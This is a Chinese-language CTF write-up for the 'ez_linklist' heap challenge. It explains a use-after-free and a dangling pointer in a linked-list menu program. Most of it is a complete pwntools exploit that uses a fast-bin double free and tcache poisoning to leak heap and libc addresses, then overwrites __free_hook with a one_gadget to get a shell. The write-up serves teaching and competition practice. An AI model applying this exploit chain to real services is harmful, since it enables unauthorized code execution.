---
title: ez_linklist
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
---

在链表中非常复杂的fast bin double free。
<!-- more -->

64位菜单题，大部分保护都开了

里面有个链表的数组chunk_list，还有记录每个链表中节点个数的数组chunk_num。

```c
struct node    //固定0x18大小
{
    node* next;    //指向下一个node
    int size;    //content的chunk的user size,size<=0x70
    _Qword* content;    //content指针，指向malloc(size)
}
```

大概有4个功能，增加结点(add)、删除结点(delete)、连接(link)、解除连接(unlink)

add是创建一个node以及其content，在chunk_list中找到一个idx最小的空位，将node放到那里。

delete有两种模式，如果输入的offset==255,那么则是把这一条链表的node及其content从头到尾进行free，否则是free该链表的第offset个node和content。delete处存在UAF，如果offset!=255，free后的node中仍保存着content指针,并且content内容不会改变。

link是将两个chunk_list连接在一起，dest_list会链接到src_list的末尾，并且chunk_list[dest]=0，让它指向空。

unlink是根据offset将一个chunk从chunk_list中取出，第offset个chunk会成为idx最小的空chunk_list的第1个chunk，**但是分出去的chunk的next部分没有清空，仍然指向原来后续的chunk**。除此之外，unlink会**输出**该chunk_list下所有chunk的content，可以用来泄露。

exp:

```python

from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
#p = process("./pwn")  
p = remote("tcp.dasc.buuoj.cn", 24502)

def add(size,content):
    p.recvuntil("Your choice:\n")
    p.sendline(str(1))
    p.recvuntil("Size:\n")
    p.sendline(str(size))
    p.recvuntil("Content:\n")
    p.send(content)

def dele(idx,offset):
    p.recvuntil("Your choice:\n")
    p.sendline(str(2))
    p.recvuntil("Index\n")
    p.sendline(str(idx))
    p.recvuntil("Input offset:\n")
    p.sendline(str(offset))

def link(src,dest):
    p.recvuntil("Your choice:\n")
    p.sendline(str(3))
    p.recvuntil("link from:\n")
    p.sendline(str(src))
    p.recvuntil("link to:\n")
    p.sendline(str(dest))

def unlink(idx,offset):
    p.recvuntil("Your choice:\n")
    p.sendline(str(4))
    p.recvuntil("Index:\n")
    p.sendline(str(idx))
    p.recvuntil("Input offset:\n")
    p.sendline(str(offset))

for i in range(6):
    add(0x40,'a'*0x8)#0,1,2,3,4,5

#list[0]:0=>1=>2
#list[3]:3=>4=>5
link(0,1)
link(0,2)
link(3,4)
link(3,5)

#list[0]:0=>2
#list[1]:1=>2
#list[3]:3=>4=>5
unlink(0,1)

#fill tcache and add chunk13
for i in range(8):
    add(0x40,'a'*0x8)#chunk6~13,idx == 2,4,5,6,7,8,9,10

#list[0]:0=>2
#list[1]:1=>2
#list[2]:6
#list[3]:3=>4=>5
#list[4]:7
#list[5]:8
#list[6]:9
#list[7]:10
#list[8]:11
#list[9]:12
#list[10]:13

dele(2,0)
dele(4,0)
dele(5,0)
dele(6,0)
dele(7,0)
dele(8,0)
dele(9,0)

#double free
#fast bin :
#2=>1=>2
dele(0,1)
dele(1,255)

#list[0]:0
#list[1]:null
#list[2]:null
#list[3]:3=>4=>5
#list[4]:null
#list[5]:null
#list[6]:null
#list[7]:null
#list[8]:null
#list[9]:null
#list[10]:13

#clear tcache
for i in range(7):
    add(0x40,'a'*0x8)#idx=1,2,4,5,6,7,8

#fast bins to tcache
#tcache:
#2=>1=>2

# fastbins chunk2=>chunk1=>chunk2
# 0x20: 0x5631022d53c0 —▸ 0x5631022d5350 ◂— 0x5631022d53c0
# 0x50: 0x5631022d5370 —▸ 0x5631022d5300 ◂— 0x5631022d5370
#reset the fd of content2
add(0x40,'\x00')#idx=9 chunk2
#after this work, chunk1=>chunk2=>0x0(next=0 in function add())
#but in content, we only write a lowbyte '\x00' in the fd
#so it change from 0x5631022d5300 to 0x5631022d5300  (如果最低位不是\x00也会变为\x00)
#when malloc , chunks in fast bins transfer to tcachebins
# tcachebins chunk1=>chunk2
# 0x20 [  3]: 0x5631022d5360 —▸ 0x5631022d53d0 ◂— 0x0(next have clear in add())
# 0x50 [  3]: 0x5631022d5310 —▸ 0x5631022d5380 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...

#list[0]:0
#list[1]:6
#list[2]:7
#list[3]:3=>4=>5
#list[4]:8
#list[5]:9
#list[6]:10
#list[7]:11
#list[8]:12
#list[9]:2
#list[10]:13

#list[9]: 2=>13
link(9,10)

add(0x40,'b'*0x8)#idx=10 chunk1
add(0x40,'b'*0x8)#idx=11 chunk2

link(0,9)
link(1,11)

#list[0]:0=>2=>13
#list[1]:6=>2
#list[2]:7
#list[3]:3=>4=>5
#list[4]:8
#list[5]:9
#list[6]:10
#list[7]:11
#list[8]:12
#list[9]:null
#list[10]:1
#list[11]:null

#dele chunk1 and chunk2
dele(10,0)
dele(1,1)
#after dele chunk1 and chunk2
# tcachebins : chunk2=>chunk1
# 0x20 [  3]: 0x5631022d53d0 —▸ 0x5631022d5360 —▸ 0x5631022d58a0 ◂— 0x0 link chunk2 and chunk13 so next->chunk13
# 0x50 [  3]: 0x5631022d5380 —▸ 0x5631022d5310 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...(2a0是pre_size，也就是chunk0的content)

#list[0]:0=>2=>13
#list[1]:6
#list[2]:7
#list[3]:3=>4=>5
#list[4]:8
#list[5]:9
#list[6]:10
#list[7]:11
#list[8]:12
#list[9]:null
#list[10]:null
#list[11]:null

p.recvuntil("Your choice:\n")
p.sendline(str(4))
p.recvuntil("Index:\n")
p.sendline(str(0))

#leak heap base by chunk2_content.fd(chunk1_content) - offset.
p.recvuntil("Offset 1:")
heap_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x310
# log.info("heap_base : " + hex(heap_base))
p.recvuntil("Input offset:\n")
p.sendline(str(1))

#list[0]:0=>13
#list[1]:6
#list[2]:7
#list[3]:3=>4=>5
#list[4]:8
#list[5]:9
#list[6]:10
#list[7]:11
#list[8]:12
#list[9]:2
#list[10]:null
#list[11]:null

add(0x40,'a'*0x8)#idx=10 chunk2

add(0x40,'a'*0x8)#idx=11 chunk1

#list[0]:0=>2=>13
#list[1]:6
#list[2]:7
#list[3]:3=>4=>5
#list[4]:8
#list[5]:9
#list[6]:10
#list[7]:11
#list[8]:12
#list[9]:2
#list[10]:2
#list[11]:1

#set idx 11 size , to get unsorted bin
payload = p64(heap_base + 0x2a0) + p64(0x441) + b'aaaaaaaa'(+0x2a0是为了保持原来的数据)
add(0x40,payload)#idx=12 0x5631022d58a0 -> content == 0x5631022d52f0
#now the size of chunk1 is 0x441 , prev_size =0x5631022d52a0(chunk0的content)
#add后 0x50 [  0]: 0x5631022d52a0 ◂— ...(chunk0的content)导致的free，但实际上没执行free
#unsorted bin
dele(11,0)

# unsortedbin
# all: 0x5631022d5300 —▸ 0x7f1998a0bbe0 (main_arena+96) ◂— 0x5631022d5300
# 0x5631022d5300:	0x00005631022d52a0	0x0000000000000441
# 0x5631022d5310:	0x00007f1998a0bbe0	0x00007f1998a0bbe0
#修改了size之后，后续9个chunk（含content）和1个content也被包含在chunk1的content中
#即一直到chun10的content都被包含了，chunk10本体并没有

add(0x60,'a'*0x8) #idx=11
#从chunk1 size==0x441的bin中切割出size==0x71的chunk作为content

#unlink to leak
link(1,10)

#list[0]:0=>2=>13
#list[1]:6=>2
#list[2]:7
#list[3]:3=>4=>5
#list[4]:8
#list[5]:9
#list[6]:10
#list[7]:11
#list[8]:12
#list[9]:2
#list[10]:null
#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）
#list[12]:14

p.recvuntil("Your choice:\n")
p.sendline(str(4))
p.recvuntil("Index:\n")
p.sendline(str(1))

#leak libc base
#此时原来chunk2的content在0x3d1大小的chunk的起始位置
#通过unlink输出content中的unsortbin头
p.recvuntil("Offset 1:")
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = 0xe6c81
one_gadget_addr = libc_base + one_gadget
# log.info("libc_base : " + hex(libc_base))
# log.info("free_hook : " + hex(free_hook))
# log.info("one_gadget_addr : " + hex(one_gadget_addr))
# log.info("heap_base : " + hex(heap_base))
p.recvuntil("Input offset:\n")
p.sendline(str(1))

#fill of tcache
dele(0,0)
dele(1,0)
dele(2,0)
dele(4,0)
dele(5,0)
dele(6,0)
dele(7,0)
#11=>10=>9=>8=>7=>6=>0

#use list[3]
unlink(3,1)

#double free
dele(3,1)
dele(1,255)
#fast bin5=>4=>5
# 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510
# 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0


#list[0]:2=>13
#list[1]:null
#list[2]:null
#list[3]:3
#list[4]:null
#list[5]:null
#list[6]:null
#list[7]:null
#list[8]:null
#list[9]:2
#list[10]:2
#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）
#list[12]:14

for i in range(7):
    add(0x40,'a'*0x8)

link(1,10)
link(1,11)
link(1,12)
link(1,13)

#list[0]:2=>13=>2=>1=>14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）
#list[1]:11
#list[2]:10
#list[3]:3
#list[4]:9
#list[5]:8
#list[6]:7
#list[7]:6
#list[8]:0
#list[9]:2
#list[10]:null
#list[11]:null
#list[12]:null

#fast bin5=>4=>5
# 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510
# 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0
#通过double free 后的add修改tcache的指针指向
add(0x40,p64(free_hook) + b'aaaa')#5


link(10,9)

# tcachebins
# 0x20 [  3]: 0x5631022d54b0 —▸ 0x5631022d5520 ◂— 0x0
# 0x50 [  4]: 0x5631022d52b0 —▸ 0x5631022d5460 —▸ 0x5631022d54d0 —▸ 0x7f1998a0de48 (__free_hook) ◂— 0x0
#连续申请4个来改写__free_hook,tcache不会检查size
add(0x40,p64(free_hook) + b'aaaa')#4
add(0x40,p64(free_hook) + b'aaaa')#5
add(0x40,p64(free_hook) + b'aaaa')#15

add(0x40,p64(one_gadget_addr) + b'aaaa')#16

#list[0]:2=>13=>2=>1=>14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）
#list[1]:11
#list[2]:10
#list[3]:3
#list[4]:9
#list[5]:8
#list[6]:7
#list[7]:6
#list[8]:0
#list[9]:4
#list[10]:5=>2
#list[11]:5
#list[12]:15
#list[13]:16

#调用free,执行one_gadget
p.recvuntil("Your choice:\n")
p.sendline(str(2))
p.recvuntil("Index\n")
p.sendline(str(0))
p.recvuntil("Input offset:\n")
p.sendline(str(0))


p.interactive()
```
